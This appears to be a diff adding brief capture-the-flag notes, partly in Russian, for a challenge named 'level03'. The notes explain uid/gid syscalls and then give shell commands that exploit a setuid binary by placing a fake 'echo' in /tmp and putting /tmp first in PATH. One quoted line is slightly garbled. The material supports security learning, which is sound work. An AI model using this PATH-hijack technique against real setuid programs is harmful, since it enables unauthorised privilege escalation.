@@ -1,0 +1,12 @@
+use nm or  ltrace or gdb + disas main to analyse the binary
+
+getegid возвращает еффективный идентификатор группы текущего процесса
+geteuid возвращает эффективный идентификатор ID пользователя в текущем процессе
+setresuid устанавливает идентификатор реального пользователя, идентификатор эффективного пользователя и идентификатор сохраненного пользователя текущего процесса
+setresgid устанавливает идентификаторы групп реальных, эффективных и сохраненных пользователей процесса с теми же ограничениями
+
+system("/usr/bin/env echo Exploit me"Exploit me") - uses not a built in echo and we have rights in tmp folder so:
+echo getflag > /tmp/echo
+chmod +x /tmp/echo
+export PATH=/tmp:$PATH
+./level03
